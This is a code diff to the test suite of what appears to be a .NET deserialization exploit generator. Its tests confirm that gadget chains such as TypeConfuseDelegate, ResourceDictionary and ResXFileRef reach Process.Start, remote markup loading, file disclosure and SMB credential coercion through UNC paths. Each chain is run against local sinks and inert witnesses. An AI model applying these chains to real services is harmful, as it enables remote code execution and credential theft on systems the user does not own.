+            // The known --bgc option-namespace collision, asserted rather than worked around:
+            // TypeConfuseDelegate accepts variants 1-3, so bridging it under a variant number
+            // it does not know is refused by the LEAF, with the leaf named in the message. This
+            // is catalogue-wide behaviour, not something these two gadgets introduce, and the
+            // refusal is the good outcome - the alternative is a leaf silently building a
+            // different payload.
+            RunResult collide = GenerateClaimsKeyPayload("WindowsClaimsIdentity", "BinaryFormatter",
+                4, false, "TypeConfuseDelegate");
+            AssertTrue(!collide.Success,
+                "a --bgc leaf that does not know the outer gadget's variant number refuses the chain");
+            AssertTrue(collide.ErrorMessage != null && collide.ErrorMessage.Contains("TypeConfuseDelegate"),
+                "the refusal names the bridged gadget that rejected the option (got: " + collide.ErrorMessage + ")");
+        }
+
+        // Both claims carriers wrap their NetDataContractSerializer document in a <root>
+        // envelope, which no other gadget in this family does. That envelope is not decoration:
+        // NetDataContractSerializer cannot read <root> itself, so anything that deserializes
+        // one of these payloads - the fire rows, a target, and the gadget's own -t - has to be
+        // pointed at the child element. WindowsIdentity's -t used to omit the root name, so it
+        // threw before reaching the payload and reported nothing.
+        private static void ClaimsKeyNdcsPayloadNeedsItsRootEnvelope()
+        {
+            foreach (string gadget in new[] { "WindowsIdentity", "WindowsClaimsIdentity" })
+            {
+                RunResult r = GenerateClaimsKeyPayload(gadget, "NetDataContractSerializer", 1, false, null);
+                AssertTrue(r.Success, gadget + " generates its NDCS payload");
+                string doc = Text(r.Raw);
+                AssertTrue(doc.TrimStart().StartsWith("<root>"),
+                    gadget + " wraps its NDCS document in <root>");
+
+                bool threwWithoutRoot = false;
+                try { SerializersHelper.NetDataContractSerializer_deserialize(doc); }
+                catch (Exception) { threwWithoutRoot = true; }
+                AssertTrue(threwWithoutRoot,
+                    gadget + ": NetDataContractSerializer rejects the <root> envelope when it is not told the root name");
+            }
+        }
+
         private static void PayloadsFireIntoTestSinks()
         {
             bool trace = Environment.GetEnvironmentVariable("YSONET_TRACE") != null;
@@ -12966,9 +15817,26 @@ namespace ysonet.Tests
                 "ClaimsIdentity", "ClaimsPrincipal", "GenericPrincipal", "GenericIdentity", "FormsIdentity", "RolePrincipal",
                 "SessionSecurityToken", "SessionViewStateHistoryItem", "ToolboxItemContainer",
                 "WindowsIdentity", "WindowsPrincipal", "ResourceSet", "DataTable",
+                "DataTableTypeSpoof",
             };
             foreach (string g in bfMarkerGadgets)
                 FireGadgetMarker(g, "BinaryFormatter", 0, false, false, "bf", true, failures, ref fired, ref skipped, trace);
+
+            // ---- MARKER: WindowsIdentity variants 2 and 3. Membership in bfMarkerGadgets
+            // above passes variant 0, so it only ever proves the .actor key. These four cells
+            // prove the other two branches of the same switch: variant 2 fires through
+            // m_bootstrapContext, variant 3 through DeserializeClaims. Both run a context-free
+            // new BinaryFormatter(), because WindowsIdentity chains the SINGLE-argument
+            // ClaimsIdentity constructor. The inner is TFRP, which fires Process.Start and then
+            // throws a cast error AFTER firing (to ClaimsIdentity for variant 2, to List<Claim>
+            // for variant 3), so the marker file is the proof, never a clean return. The other
+            // five advertised formatters are generation-covered by GadgetFullMatrixGenerates
+            // and key-covered by ClaimsKeyVariantsCarryOnlyTheirOwnKey: only the member NAME
+            // differs there, and variant 1 already exercises each formatter's document shape.
+            FireGadgetMarker("WindowsIdentity", "BinaryFormatter", 2, false, false, "bf", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("WindowsIdentity", "BinaryFormatter", 2, true, false, "bf", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("WindowsIdentity", "BinaryFormatter", 3, false, false, "bf", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("WindowsIdentity", "BinaryFormatter", 3, true, false, "bf", true, failures, ref fired, ref skipped, trace);
 
             // ---- MARKER: GenericIdentity carrier across its OTHER advertised formatters.
             // Like ClaimsIdentity, GenericIdentity advertises BinaryFormatter, SoapFormatter
@@ -13051,6 +15919,27 @@ namespace ysonet.Tests
             FireGadgetMarker("DataTable", "LosFormatter", 2, false, false, "los", true, failures, ref fired, ref skipped, trace);
             FireGadgetMarker("DataTable", "LosFormatter", 2, true, false, "los", true, failures, ref fired, ref skipped, trace);
 
+            // ---- MARKER: DataTableTypeSpoof, the same carrier under an in-box DataTable
+            // SUBCLASS name. These rows are the ONLY proof that the spoofed name still binds:
+            // generation alone would pass even if no target could ever resolve the type. Each
+            // cell resolves System.Data.Entity.Design.SsdlGenerator.TableDetailsCollection (an
+            // INTERNAL type in another assembly), runs its serialization constructor, chains to
+            // the inherited DataTable(SerializationInfo, StreamingContext) and rebuilds the row,
+            // which materialises the inner gadget. The BinaryFormatter cells (raw and minified)
+            // come from bfMarkerGadgets membership above; these complete Soap and Los for
+            // variant 1 and BinaryFormatter/Los for variant 2 (Soap is opted out there). They
+            // are also what earns this gadget's WithVersions declaration, because version
+            // evidence is recorded per gadget and DataTable's does not transfer. Any cell that
+            // does not fire is a real bug, never a skip.
+            FireGadgetMarker("DataTableTypeSpoof", "SoapFormatter", 0, false, false, "soap", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("DataTableTypeSpoof", "SoapFormatter", 0, true, false, "soap", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("DataTableTypeSpoof", "LosFormatter", 0, false, false, "los", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("DataTableTypeSpoof", "LosFormatter", 0, true, false, "los", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("DataTableTypeSpoof", "BinaryFormatter", 2, false, false, "bf", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("DataTableTypeSpoof", "BinaryFormatter", 2, true, false, "bf", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("DataTableTypeSpoof", "LosFormatter", 2, false, false, "los", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("DataTableTypeSpoof", "LosFormatter", 2, true, false, "los", true, failures, ref fired, ref skipped, trace);
+
             // ---- MARKER: TypeConfuseDelegate root-container variants 2 (SortedDictionary)
             // and 3 (TreeSet). Variant 1 is covered by bfMarkerGadgets membership (raw above,
             // minified below). These two keep the same Comparison<string> -> Process.Start
@@ -13113,6 +16002,22 @@ namespace ysonet.Tests
             // - WindowsClaimsIdentity needs a non-GAC assembly (Microsoft.IdentityModel, a
             //   NuGet dependency present here) to build the type on deserialize.
             FireGadgetMarker("WindowsClaimsIdentity", "BinaryFormatter", 0, false, false, "bf", false, failures, ref fired, ref skipped, trace);
+            //   The row above is variant 0, i.e. the default, which is now the .actor key.
+            //   Variants 2 and 3 are the other two mscorlib keys, and variant 4 is the WIF
+            //   type's OWN _actor member - a DIFFERENT sink, inside Microsoft.IdentityModel
+            //   rather than mscorlib's ClaimsIdentity.Deserialize, and the one that used to be
+            //   the default here. It needs its own row precisely because the default moved off
+            //   it. Same conditional skip as the row above: no assembly, no row.
+            FireGadgetMarker("WindowsClaimsIdentity", "BinaryFormatter", 2, false, false, "bf", false, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("WindowsClaimsIdentity", "BinaryFormatter", 3, false, false, "bf", false, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("WindowsClaimsIdentity", "BinaryFormatter", 4, false, false, "bf", false, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("WindowsClaimsIdentity", "BinaryFormatter", 4, true, false, "bf", false, failures, ref fired, ref skipped, trace);
+            //   Variant 4 on the other two formatters that can express it. The NDCS one is a
+            //   SEPARATE hand-written document (the IntPtr m_userToken needs a nested value
+            //   element), so it earns its own row rather than being assumed from the binary
+            //   one; the Los row proves the same marshal survives that formatter's encoding.
+            FireGadgetMarker("WindowsClaimsIdentity", "LosFormatter", 4, false, false, "los", false, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("WindowsClaimsIdentity", "NetDataContractSerializer", 4, false, false, "ndcroot", false, failures, ref fired, ref skipped, trace);
             // - TypeConfuseDelegateMono targets the Mono delegate field layout (it sets BOTH
             //   invocation-list slots to Process.Start, unlike TypeConfuseDelegate which sets
             //   only the second). On .NET Framework that graph does not fire; generation is
@@ -13204,6 +16109,22 @@ namespace ysonet.Tests
             // resolver), so fire it via a subprocess self-test rather than in-process.
             FireResxCompiledSubprocess(failures, ref fired, ref skipped, trace);
 
+            // ---- WorkflowDesigner: a write-only member whose setter runs XamlReader.Load.
+            // Every advertised formatter, raw and minified, each in its own child process.
+            foreach (string[] wdRow in WorkflowDesignerFormatters)
+            {
+                FireWorkflowDesignerSubprocess(wdRow[0], false, failures, ref fired, ref skipped, trace);
+                FireWorkflowDesignerSubprocess(wdRow[0], true, failures, ref fired, ref skipped, trace);
+            }
+
+            // ---- DynamicUpdateMapExtension: a XAML x:XData section handed to
+            // NetDataContractSerializer.ReadObject. The inner payload is this gadget's own
+            // TypeConfuseDelegate default, so a marker here proves the whole bridge - the XAML
+            // writer called ReadXml, NDCS read the embedded document, and the chain ran. Raw and
+            // minified, because --minify shrinks the outer document AND the NDCS one inside it.
+            FireGadgetMarker("DynamicUpdateMapExtension", "Xaml", 0, false, false, "xaml", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("DynamicUpdateMapExtension", "Xaml", 0, true, false, "xaml", true, failures, ref fired, ref skipped, trace);
+
             // ---- LISTENER: SSRF/callback payloads connect to a loopback capture proxy. ----
             foreach (string gadget in new[] { "PictureBox", "InfiniteProgressPage" })
             {
@@ -13275,8 +16196,14 @@ namespace ysonet.Tests
                 }
             }
 
-            // ObjectDataProvider variant 3 is the xamlurl SSRF variant: it fetches the URL on load.
-            FireOdpXamlUrlListener(failures, ref fired, trace);
+            // ResourceDictionary.Source fetches -c on load AND loads what comes back as WPF
+            // markup. Two rows, because they prove different halves.
+            FireResourceDictionaryFetch(failures, ref fired, trace);
+            FireResourceDictionaryLoadsRemoteMarkup(failures, ref fired, trace);
+
+            // ResXFileRef opens -c on the target and then does whatever the TYPE NAME in the
+            // payload says. Three effects, two formatters, each with its own evidence.
+            FireResXFileRef(failures, ref fired, trace);
 
             // ObjRef remoting is finicky (needs a process-global client channel); best-effort.
             FireObjRefListener(failures, ref fired, ref skipped, trace);
@@ -14539,36 +17466,314 @@ namespace ysonet.Tests
             }
         }
 
-        private static void FireOdpXamlUrlListener(FailureCollector failures, ref int fired, bool trace)
+        // Half one: the REQUEST. ResourceDictionary.Source opens a WebRequest for -c before
+        // anything is parsed, so an accept-and-close listener is enough, and this row still
+        // passes on a machine where nothing would come back. Both minify states, because the
+        // value travels in an XML attribute the minifier rewrites.
+        private static void FireResourceDictionaryFetch(FailureCollector failures, ref int fired, bool trace)
         {
             if (!TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
-                "fire ObjectDataProvider v3 (xamlurl SSRF)")) return;
-            if (trace) { Console.Error.WriteLine("    [fire] ObjectDataProvider v3 xamlurl (listener)"); Console.Error.Flush(); }
-            using (var listener = new LoopbackListener())
+                "fire ResourceDictionary (Source fetch)")) return;
+
+            for (int m = 0; m < 2; m++)
+            {
+                bool minify = m == 1;
+                string label = "ResourceDictionary Source fetch" + (minify ? " (minified)" : "");
+                if (trace) { Console.Error.WriteLine("    [fire] " + label); Console.Error.Flush(); }
+                using (var listener = new LoopbackListener())
+                {
+                    try
+                    {
+                        InputArgs ia = new InputArgs();
+                        ia.Cmd = listener.HttpUrl;
+                        ia.Minify = minify;
+                        ia.Test = false;
+                        RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+                        {
+                            GadgetName = "ResourceDictionary",
+                            FormatterName = "Xaml",
+                            OutputFormat = "",
+                            InputArgs = ia,
+                        });
+                        if (!r.Success || !(r.Raw is string))
+                        {
+                            failures.Add("fire " + label + ": generate -> "
+                                + (r.Success ? "not string" : r.ErrorMessage));
+                            continue;
+                        }
+                        RunSTA(delegate { SerializersHelper.Xaml_deserialize((string)r.Raw); });
+                        if (listener.Fired(MarkerWaitMs)) { fired++; RuntimeBuild.RecordFired("ResourceDictionary"); }
+                        else failures.AddCapability(TestEnvironment.LoopbackTcp, label,
+                            "fire " + label + ": listener not hit");
+                    }
+                    catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
+                }
+            }
+        }
+
+        // Half two: the LOAD, which is what earns PayloadKind.CodeExecution. The fetch alone
+        // only proves a callback; here the responder answers with a real ResourceDictionary
+        // document as application/xaml+xml (the content type MimeObjectFactory maps to the
+        // XAML converter - answer with anything else and the setter throws instead), and the
+        // document names an inert fixture type from THIS assembly. The fixture's constructor
+        // is the evidence: it can only run if the WPF markup loader parsed what came back and
+        // built the object, in the process that deserialized the payload.
+        //
+        // A CONTROL runs first with the same document at the same path, served under a content
+        // type WPF maps to no converter, so a passing row cannot be the fixture being built by
+        // something else in the process.
+        //
+        // The control's content type has to be chosen carefully, and getting it wrong is what
+        // the first version of this row did. WpfWebRequestHelper.GetContentType DISCARDS a
+        // "text/plain" or "application/octet-stream" header when the URL's extension is .xaml
+        // or .xbap, then falls back to MimeTypeMapper.GetMimeTypeFromUri - which maps .xaml
+        // straight back to XamlMime. So labelling a .xaml URL "text/plain" does NOT stop the
+        // load, and a control built on it fails while proving the opposite of what it claims.
+        // An unmapped type keeps the header, so nothing converts the stream.
+        private static void FireResourceDictionaryLoadsRemoteMarkup(FailureCollector failures, ref int fired, bool trace)
+        {
+            if (!TestEnvironment.CanRun(TestEnvironment.LoopbackTcp,
+                "fire ResourceDictionary (remote markup load)")) return;
+            if (trace) { Console.Error.WriteLine("    [fire] ResourceDictionary remote markup load"); Console.Error.Flush(); }
+
+            const string markupPath = "/witness.xaml";
+            string document =
+                "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\""
+                + " xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\""
+                + " xmlns:t=\"clr-namespace:ysonet.Tests;assembly=ysonet.Tests\">"
+                + "<t:XamlLoadWitness x:Key=\"w\"/>"
+                + "</ResourceDictionary>";
+
+            using (var server = new LegacyXmlHttpServer())
             {
                 try
                 {
-                    InputArgs ia = new InputArgs();
-                    ia.Cmd = "calc.exe"; // ignored by variant 3
-                    ia.Test = false;
-                    ia.ExtraArguments = new List<string> { "--variant", "3", "--xamlurl", listener.HttpUrl };
-                    GenerationRequest req = new GenerationRequest
+                    // Control: same document, same path, a content type WPF maps to nothing.
+                    // The response is fetched and dropped, so the witness must NOT be built.
+                    server.Serve(markupPath, document, "application/x-ysonet-not-markup");
+                    int before = XamlLoadWitness.Constructed;
+                    FetchResourceDictionary(server.UrlFor(markupPath), failures, "control");
+                    if (server.WaitForRequest(markupPath, MarkerWaitMs) == null)
                     {
-                        GadgetName = "ObjectDataProvider",
-                        FormatterName = "Xaml",
-                        OutputFormat = "",
-                        InputArgs = ia,
-                    };
-                    RunResult r = PayloadRunner.GenerateGadget(req);
-                    if (!r.Success || !(r.Raw is string)) { failures.Add("fire ObjectDataProvider v3: generate -> " + (r.Success ? "not string" : r.ErrorMessage)); return; }
-                    RunSTA(delegate { SerializersHelper.Xaml_deserialize((string)r.Raw); });
-                    if (listener.Fired(3000)) { fired++; RuntimeBuild.RecordFired("ObjectDataProvider"); }
-                    else failures.AddCapability(TestEnvironment.LoopbackTcp,
-                        "ObjectDataProvider v3 (xamlurl SSRF)",
-                        "fire ObjectDataProvider v3 (xamlurl SSRF): listener not hit");
+                        failures.AddCapability(TestEnvironment.LoopbackTcp,
+                            "ResourceDictionary remote markup load (control)",
+                            "fire ResourceDictionary markup load: the control request never arrived");
+                        return;
+                    }
+                    if (XamlLoadWitness.Constructed != before)
+                    {
+                        failures.Add("fire ResourceDictionary markup load: the witness was built for a "
+                            + "content type WPF does not map, so this row proves nothing about the loader");
+                        return;
+                    }
+
+                    // The real cell.
+                    server.Serve(markupPath, document, "application/xaml+xml");
+                    before = XamlLoadWitness.Constructed;
+                    FetchResourceDictionary(server.UrlFor(markupPath), failures, "markup load");
+                    if (XamlLoadWitness.Constructed > before)
+                    {
+                        fired++;
+                        RuntimeBuild.RecordFired("ResourceDictionary");
+                    }
+                    else
+                    {
+                        failures.Add("fire ResourceDictionary markup load: the fetched document was not "
+                            + "loaded (XamlLoadWitness was never constructed), so the payload proves a "
+                            + "callback but not code execution");
+                    }
+
+                    // And the branch that surprised this row when it was written: a server
+                    // labelling a .xaml URL "text/plain" does NOT prevent the load, because
+                    // GetContentType throws that header away and reads the extension instead.
+                    // Worth an assertion rather than a comment - it decides whether an
+                    // operator has to control the response headers at all.
+                    server.Serve(markupPath, document, "text/plain");
+                    before = XamlLoadWitness.Constructed;
+                    FetchResourceDictionary(server.UrlFor(markupPath), failures, "text/plain fallback");
+                    if (XamlLoadWitness.Constructed > before) fired++;
+                    else
+                    {
+                        failures.Add("fire ResourceDictionary markup load: a .xaml URL served as "
+                            + "text/plain was NOT loaded, so WpfWebRequestHelper.GetContentType no "
+                            + "longer falls back to the extension and the gadget documentation "
+                            + "overstates what the operator gets");
+                    }
                 }
-                catch (Exception ex) { failures.Add("fire ObjectDataProvider v3: " + ex.Message); }
+                catch (Exception ex) { failures.Add("fire ResourceDictionary markup load: " + ex.Message); }
             }
+        }
+
+        // Generate the gadget for one URL and deserialize it, which is what makes the Source
+        // setter run. Shared by the control and the real cell so both drive the same path.
+        private static void FetchResourceDictionary(string url, FailureCollector failures, string label)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = url;
+            ia.Test = false;
+            RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = "ResourceDictionary",
+                FormatterName = "Xaml",
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+            if (!r.Success || !(r.Raw is string))
+            {
+                failures.Add("fire ResourceDictionary " + label + ": generate -> "
+                    + (r.Success ? "not string" : r.ErrorMessage));
+                return;
+            }
+            RunSTA(delegate { SerializersHelper.Xaml_deserialize((string)r.Raw); });
+        }
+
+        // ---- ResXFileRef: three effects, two formatters ------------------------
+        //
+        // The converter's branches differ only in the type name the payload carries, so one
+        // row covers all three and each cell brings its own evidence:
+        //
+        //   variant 1  the deserialized value IS the fixture's text. Content recovery, which
+        //              is what earns PayloadKind.InformationDisclosure - a request that did
+        //              not throw would prove nothing.
+        //   variant 2  a test-owned .resources file whose single entry is a [Serializable]
+        //              witness with an [OnDeserialized] callback. The counter moving proves
+        //              a BinaryFormatter ran inside ResourceSet(Stream), in the process that
+        //              read the payload.
+        //   variant 3  a test-owned type with one public (Stream) constructor. The counter
+        //              and the byte count prove the Activator branch with no dangerous
+        //              effect at all.
+        //
+        // Nothing here needs a wall-clock budget: all three effects are synchronous, so the
+        // assertion runs the moment the deserialize returns.
+        private const string ResXFileRefFireMarker = "ysonet ResXFileRef fire fixture marker";
+
+        private static void FireResXFileRef(FailureCollector failures, ref int fired, bool trace)
+        {
+            string textFixture = null, blobFixture = null;
+            string resourcesFixture = TestArtifactPath("ysonet_resxfileref_stage.resources");
+            try
+            {
+                textFixture = WriteTestArtifact("ysonet_resxfileref_text.txt", ResXFileRefFireMarker);
+                blobFixture = WriteTestArtifact("ysonet_resxfileref_blob.bin", ResXFileRefFireMarker);
+
+                // ResourceWriter serializes a non-primitive value with a plain
+                // BinaryFormatter, which is exactly the second stage this variant reaches.
+                using (var writer = new System.Resources.ResourceWriter(resourcesFixture))
+                {
+                    writer.AddResource("witness", new ResourceSetLoadWitness());
+                }
+
+                foreach (string formatter in new[] { "Xaml", "YamlDotNet" })
+                {
+                    // Variant 1, twice: once letting the target pick Encoding.Default, once
+                    // naming the encoding, because --enc adds a third field to the value.
+                    foreach (string[] encodingArgs in new[] { new string[0], new[] { "--enc", "utf-8" } })
+                    {
+                        string label = "ResXFileRef " + formatter + " read the file back"
+                            + (encodingArgs.Length == 0 ? "" : " (utf-8)");
+                        if (trace) { Console.Error.WriteLine("    [fire] " + label); Console.Error.Flush(); }
+
+                        var args = new List<string> { "--variant", "1" };
+                        args.AddRange(encodingArgs);
+                        object read = DeserializeResXFileRef(formatter, textFixture, args.ToArray(),
+                            failures, label);
+                        if (read == null) continue;
+
+                        string asText = read as string;
+                        if (asText == null)
+                            failures.Add("fire " + label + ": the value came back as "
+                                + read.GetType().Name + ", not the file's text");
+                        else if (asText != ResXFileRefFireMarker)
+                            failures.Add("fire " + label + ": the value was \"" + asText
+                                + "\", not the fixture's content");
+                        else { fired++; RuntimeBuild.RecordFired(ResXFileRefGadget); }
+                    }
+
+                    // Variant 2: the nested BinaryFormatter.
+                    string resourcesLabel = "ResXFileRef " + formatter + " load a .resources file";
+                    if (trace) { Console.Error.WriteLine("    [fire] " + resourcesLabel); Console.Error.Flush(); }
+                    int witnessBefore = ResourceSetLoadWitness.Deserialized;
+                    object loaded = DeserializeResXFileRef(formatter, resourcesFixture,
+                        new[] { "--variant", "2" }, failures, resourcesLabel);
+                    if (loaded != null)
+                    {
+                        if (ResourceSetLoadWitness.Deserialized > witnessBefore)
+                        { fired++; RuntimeBuild.RecordFired(ResXFileRefGadget); }
+                        else
+                            failures.Add("fire " + resourcesLabel + ": a "
+                                + loaded.GetType().Name + " came back but the witness was never "
+                                + "deserialized, so no BinaryFormatter ran over the file");
+                    }
+
+                    // Variant 3: the Activator branch, aimed at a type that does nothing.
+                    string activateLabel = "ResXFileRef " + formatter + " activate a named type";
+                    if (trace) { Console.Error.WriteLine("    [fire] " + activateLabel); Console.Error.Flush(); }
+                    int activationsBefore = StreamActivationWitness.Constructed;
+                    object activated = DeserializeResXFileRef(formatter, blobFixture,
+                        new[] { "--variant", "3", "--type",
+                            typeof(StreamActivationWitness).AssemblyQualifiedName },
+                        failures, activateLabel);
+                    if (activated != null)
+                    {
+                        if (!(activated is StreamActivationWitness))
+                            failures.Add("fire " + activateLabel + ": the value came back as "
+                                + activated.GetType().Name + ", not the type that was named");
+                        else if (StreamActivationWitness.Constructed <= activationsBefore)
+                            failures.Add("fire " + activateLabel
+                                + ": the witness was not constructed by the converter");
+                        else if (StreamActivationWitness.LastLength != ResXFileRefFireMarker.Length)
+                            failures.Add("fire " + activateLabel + ": the constructor received "
+                                + StreamActivationWitness.LastLength + " bytes, not the whole "
+                                + ResXFileRefFireMarker.Length + "-byte file");
+                        else { fired++; RuntimeBuild.RecordFired(ResXFileRefGadget); }
+                    }
+                }
+            }
+            catch (Exception ex) { failures.Add("fire ResXFileRef: " + ex.Message); }
+            finally
+            {
+                SafeDelete(textFixture);
+                SafeDelete(blobFixture);
+                SafeDelete(resourcesFixture);
+            }
+        }
+
+        // Generate one ResXFileRef cell and deserialize it with the serializer the target
+        // would use, returning what came back. Null means the cell already failed and the
+        // reason is recorded.
+        private static object DeserializeResXFileRef(string formatter, string path, string[] extra,
+            FailureCollector failures, string label)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = path;
+            ia.Test = false;
+            ia.ExtraArguments = new List<string>(extra);
+            RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = ResXFileRefGadget,
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+            if (!r.Success || !(r.Raw is string))
+            {
+                failures.Add("fire " + label + ": generate -> "
+                    + (r.Success ? "not string" : r.ErrorMessage));
+                return null;
+            }
+
+            object result = null;
+            Exception thrown = null;
+            RunSTA(delegate
+            {
+                try { result = PayloadReader.Read(r.Raw, formatter, null); }
+                catch (Exception ex) { thrown = ex; }
+            });
+
+            if (result == null)
+                failures.Add("fire " + label + ": deserialize -> "
+                    + (thrown == null ? "returned null" : thrown.GetType().Name + ": " + thrown.Message));
+            return result;
         }
 
         // ObjRef makes an outbound .NET Remoting call to the -c URL on deserialize, but the
@@ -14659,7 +17864,14 @@ namespace ysonet.Tests
         //   3 extra CLI arguments, space separated ("" for none)
         //   4 UNC path shape: "shortname" for the 8.3 expansion trigger
         //     (\\host\share\aaaaaa~1\x), "dll" for a loadable assembly path
-        //     (\\host\share\payload.dll)
+        //     (\\host\share\payload.dll), "plain" for an ordinary UNC file path
+        //     (\\host\share\file.txt)
+        //
+        // "plain" means opposite things for different sinks, so read the gadget before
+        // copying a row: for FileSystemInfo a path with no "~" component is the CONTROL
+        // that must cause no lookup, because there the callback is a side effect of 8.3
+        // expansion. For a gadget that OPENS the path (ResourceDictionary hands it to a
+        // WebRequest), the plain form is the real trigger and no short name is involved.
         // A row whose gadget is not registered yet logs a skip naming it, so this workflow
         // is ready the day a gadget lands.
         //
@@ -14678,6 +17890,16 @@ namespace ysonet.Tests
             // Variant 2 is the UNC variant, and the path has to end in .dll because the
             // gadget refuses anything else (Assembly.LoadFrom is the sink).
             new string[] { "AssemblyInstallerLoad", "Json.NET", "json", "--variant 2", "dll" },
+            // ResourceDictionary.Source opens whatever -c names. A UNC path therefore makes
+            // the target start an SMB session, which is the credential-coercion use the
+            // gadget documents; the loopback rows cannot show it, because SMB is fixed at
+            // port 445 and the Windows SMB client owns the loopback UNC path.
+            new string[] { "ResourceDictionary", "Xaml", "xaml", "", "plain" },
+            // ResXFileRef opens -c with a StreamReader or a FileStream, so a UNC path makes
+            // the target start an SMB session before anything is parsed. Variant 1 is the
+            // right one here: it needs nothing on the share, while the other two want a real
+            // second-stage file there.
+            new string[] { "ResXFileRef", "Xaml", "xaml", "--variant 1", "plain" },
         };
 
         // ---- OOB tier orchestration --------------------------------------------
@@ -15129,7 +18351,10 @@ namespace ysonet.Tests
         {
             if (RefuseToFireDosGadget(gadget, failures)) return;
             string label = oob.NewLabel(gadget.ToLowerInvariant());
-            string uncPath = pathShape == "dll" ? oob.UncDllPath(label) : oob.ShortNameUncPath(label);
+            string uncPath;
+            if (pathShape == "dll") uncPath = oob.UncDllPath(label);
+            else if (pathShape == "plain") uncPath = oob.PlainUncPath(label);
+            else uncPath = oob.ShortNameUncPath(label);
             if (trace) { Console.Error.WriteLine("    [fire] " + gadget + " -> " + uncPath); Console.Error.Flush(); }
             try
             {
@@ -15504,7 +18729,8 @@ namespace ysonet.Tests
 
                 FireNetNonRceListener("PictureBox", "Json.NET", false, failures, ref fired, false);
                 FireDataViewManagerXxe("Xaml", false, true, failures, ref fired, ref skipped, false);
-                FireOdpXamlUrlListener(failures, ref fired, false);
+                FireResourceDictionaryFetch(failures, ref fired, false);
+                FireResourceDictionaryLoadsRemoteMarkup(failures, ref fired, false);
                 FireObjRefListener(failures, ref fired, ref skipped, false);
                 FireWbemClassObjectUnmarshalComSink(failures, ref fired, false);
 
@@ -15514,8 +18740,8 @@ namespace ysonet.Tests
                     "no Wbem payload was generated");
                 AssertEqual(0, fired, "nothing fired");
                 AssertEqual(0, failures.Count, "and a missing capability is not a failure");
-                AssertEqual(4 + WbemFormatters.Length * 2, TestEnvironment.EnvironmentSkipCount,
-                    "four loopback rows plus every Wbem cell are named individually");
+                AssertEqual(5 + WbemFormatters.Length * 2, TestEnvironment.EnvironmentSkipCount,
+                    "five loopback rows plus every Wbem cell are named individually");
             });
         }
 
@@ -17784,6 +21010,9 @@ namespace ysonet.Tests
             // A single derived value cannot say "both", so the target path wins and the
             // write variant declares WithInputs(target-path, local-file) explicitly.
             AssertEqual(PayloadInput.TargetPath, GadgetFacetReader.DeriveInput(CommandInputType.TargetPathAndLocalFile), "target path + local file->target-path");
+            // An address is real operator input, so it is never "none", and no broad
+            // input family describes a number in the target's address space.
+            AssertEqual(PayloadInput.Other, GadgetFacetReader.DeriveInput(CommandInputType.MemoryAddress), "memory address->other");
             AssertEqual(PayloadInput.None, GadgetFacetReader.DeriveInput(CommandInputType.Ignored), "ignored->none");
 
             // Every enum member must have its own derivation: a new input type that is not
@@ -17987,6 +21216,24 @@ namespace ysonet.Tests
                 RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
 
             AssertCap("DataTable", 2,
+                new[] { PayloadKind.CodeExecution },
+                new[] { PayloadInput.Command },
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
+                RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
+
+            // DataTableTypeSpoof is the same carrier under a DataTable SUBCLASS name, so it
+            // declares exactly what DataTable declares, per variant. Kept next to the pair
+            // above on purpose: the only difference between the two gadgets is the type name
+            // on the wire, and a requirement that drifts apart here would be a false claim.
+            // The default profile's assembly (System.Data.Entity.Design) is serviced as part
+            // of the .NET Framework, so it adds no ExtraAssembly requirement of its own.
+            AssertCap("DataTableTypeSpoof", 1,
+                new[] { PayloadKind.CodeExecution },
+                new[] { PayloadInput.Command },
+                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf, GadgetRequirement.NetFramework },
+                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
+
+            AssertCap("DataTableTypeSpoof", 2,
                 new[] { PayloadKind.CodeExecution },
                 new[] { PayloadInput.Command },
                 new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
